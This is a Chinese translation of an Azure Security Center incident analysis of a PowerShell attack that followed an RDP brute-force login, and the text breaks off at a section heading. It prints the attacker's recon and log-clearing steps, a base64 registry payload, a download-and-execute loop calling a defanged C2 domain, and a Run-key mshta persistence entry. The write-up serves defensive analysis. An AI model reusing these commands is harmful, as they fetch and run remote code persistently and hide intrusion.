# 【技术分享】Azure Security Center针对PowerShell攻击的深入分析
|
##### 译文声明
本文是翻译文章，文章来源：azure.microsoft.com
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
译者：[shan66](http://bobao.360.cn/member/contribute?uid=2522399780)
预估稿费：200RMB
投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿
**前言**
为了纪念[国家网络安全意识月（NCSAM）](https://www.dhs.gov/national-cyber-security-awareness-month)，我们发布了一篇新的系列文章，来重点介绍 **Azure Security Center**
是如何检测、追查和缓解现实世界所面临的各种网络攻击的。在这篇文章中，我们将向读者分析攻击者是如何使用PowerShell来运行恶意代码并收集用户凭据的。在详细介绍这一攻击手法之前，不妨先对本系列中其他文章进行一个回顾，其中Security
Center能够检测到：
[**SQL暴力攻击**](https://azure.microsoft.com/en-us/blog/how-azure-security-center-helps-reveal-a-cyberattack/)
[**比特币采矿攻击**](https://azure.microsoft.com/en-us/blog/how-azure-security-center-detects-a-bitcoin-mining-attack/)
[**基于网络威胁情报的DDoS攻击**](https://azure.microsoft.com/en-us/blog/how-azure-security-center-detects-ddos-attack-using-cyber-threat-intelligence/)
[**恶意使用正常的应用程序**](https://azure.microsoft.com/en-us/blog/how-azure-security-center-aids-in-detecting-good-applications-being-used-maliciously/)
在这篇文章中，我们将介绍Azure Security
Center检测到的另一个有趣的真实世界的攻击场景，并且这次调查是由我们的团队负责的。需要注意的是，为了保护隐私，受影响公司的名称、所有计算机名称和所有用户名都已进行了更换。这种特殊攻击使用PowerShell来运行内存中的恶意代码，目的是通过密码窃取、按键记录、剪贴板抓取和屏幕捕获来收集凭据信息。该攻击首先会进行
**RDP Force**
攻击，最终将在注册表中实现设置和配置持久自动启动（ASEP）的目的。这个案例研究不仅介绍了该攻击的原理，并提供了如何在您的环境中检测和防止类似攻击的建议。
**  
**
**Azure安全中心的原始警报和详细信息**
由于世界上存在许多远程管理的联网计算机，所以黑客们一直都在努力搜寻各种正在运行的远程管理服务，如远程桌面协议（RDP），以便通过暴力攻击破解密码。我们的案例是从一个大客户的Azure
Security Center控制台开始的，该控制台提示存在RDP暴力攻击活动以及可疑的PowerShell活动。
在下面的Azure Security Center屏幕截图中，您可以按照从下到上的时间顺序进行查看，我们可以发现“Failed RDP Brute
Force Attack”警报后面是一个“Failed RDP Brute Force
Attack”警报——这表示有人通过RDP登录猜到了用户密码，在这种恶意的暴力登录警报后面，是几个异常PowerShell活动的警报。
当我们检查最初的Successful RDP Brute Force
Attack警报时，可以看到攻击的时间、受到攻击的帐户、攻击源的IP地址（这里是意大利），以及Microsoft’s Threat Intel的“RDP
Brute Forcing”报告的链接。
成功登录后，后面给出了一些高级严重性警报，并且Azure安全中心会按时间顺序显示攻击者登录成功后执行的每个命令行：
**  
**
**原始的攻击和攻击者活动的细节**
根据上述警报提供的信息，我们的调查团队与客户一起审查了从攻击者最初登录时获取的帐户登录日志（事件ID 4624）和进程创建日志（事件ID 4688）。
根据原始的登录数据，我们看到攻击者使用了各种用户名和密码组合来进行持续的RDP暴力尝试。大多数失败的尝试最终会引发事件ID
4625（帐户登录失败）、状态码0xc000006d（尝试登录无效）和一个子代码0xc0000064（指定的帐号不存在）。
在09月06日上午10:13左右，我们看到Substatus码开始发生变化。从这里可以看出，使用用户名“ContosoAdmin”导致了不同的状态码：0xc000006a（密码错误）。
之后是使用“ContosoAdmin”帐户登录成功，类型分别为3和10（远程交互）。从IP地址（188.125.100.233）来看，这次是从意大利进行登录的。
下面，我们来检查一下登录后的进程创建活动。攻击者首先执行了“whoami”命令，来查看当前的登录用户。然后使用net group “Domain
Admins” /domain命令查看了“Domain Admins”组的成员。之后，又执行了“qwinsta”命令，来显示所有Remote Desktop
Services会话。然后启动Taskmgr（Windows任务管理器）以查看或管理相应的进程和服务。
稍后，攻击者执行了另一个PowerShell命令。该命令用Base64编码的字符串进行了混淆处理，另外，还利用Deflate压缩算法进行了压缩处理。注意：在后文中，我们会对这些Base64编码的字符串进行解码，届时我们将进一步挖掘该命令的用法。
约3分钟后，攻击者从这台机器上面注销了。但是在注销之前，他们会通过清除所有事件日志来掩盖自己的踪迹。这是通过内置的wevtutil.exe（Windows事件命令行实用程序）来完成的。首先，使用"el"或"enum-logs"开关枚举所有事件日志。然后用“cl”或“清除日志”开关清除所有事件日志。以下是攻击者执行的部分事件清除命令。
**  
**
**深入考察Base64编码的PowerShell命令**
我们对攻击者的原始命令的Base64编码的部分进行解码后，竟然出现了更多的Base64编码命令，这表明：
**嵌套的Base64混淆处理。**
**所有级别的命令执行都进行了混淆处理。**
**创建一个仅使用注册表的ASEP（自动启动扩展点）作为持久性机制。**
**恶意代码参数存储在注册表中。**
**由于ASEP和参数仅出现系统注册表中，所以这些命令可以在不借助文件或NTFS组件的情况下以“in-memory”的方式执行。**
这是攻击者执行的原始命令：
解码Base64后可以看到，许多注册表项和更多的Base64字符串有待解码……
解码这些嵌套的Base64值后，我们发现该命令执行了以下操作：
1\.
该命令首先把后面的命令用到的参数存储在HKLMSoftwareMicrosoftWindowsCurrentVersion下的名为“SeCert”的注册表单元中。
    [HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersion]
    "SeCert"="dwBoAGkAbABlACgAMQApAHsAdAByAHkAewBJAEUAWAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALg
    BEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBkAG0AcwBlAHIAdgBlAHIAcwAuAGMAbwBtAC8AJwArACgAWwBjAGgAYQBy
    AF0AKAA4ADUALQAoAC0AMwA3ACkAKQApACkAfQBjAGEAdABjAGgAewBTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAtAHMAIAAxADAAfQB9AA=="
2\. 上述注册表项中的Base64值解码之后，实际上就是一条从恶意C2（C&C）域（mdmservers[.]com）进行下载的命令。
    while(1){try{IEX(New-Object Net.WebClient).DownloadString('hxxp[:]//mdmservers[.]com/'+([char](85-(-37))))}catch{Start-Sleep -s 10}}
3\.
然后，攻击者的命令通过“HKLMSoftwareMicrosoftWindowsCurrentVersionRun”中名为“SophosMSHTA”的注册表ASEP（自动启动扩展点）实现持久性机制。
    [HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionRun]
    "SophosMSHTA"="mshta vbscript:CreateObject("Wscript.Shell").Run("powershell.exe -c ""$x=$((gp HKLM:Software\Microsoft\Windows\CurrentVersion SeCert).SeCert);powershell -E $x""",0,True)(window.close)"
4\. 该注册表的持久性能够确保机器每次启动或重启时都会启动该恶意命令。
5\. 注册表ASEP会启动Microsoft脚本引擎（mshta.exe）。
6\.
Mshta.exe将运行PowerShell.exe，然后，它将读取并解码HKLMSOFTWAREMicrosoftWindowsCurrentVersion->“SeCert”的值。
7\. SeCert的注册表值会通知PowerShell从hxxp[:]//mdmservers[.]com下载并启动恶意脚本。
**  
**
**恶意代码的下载和执行**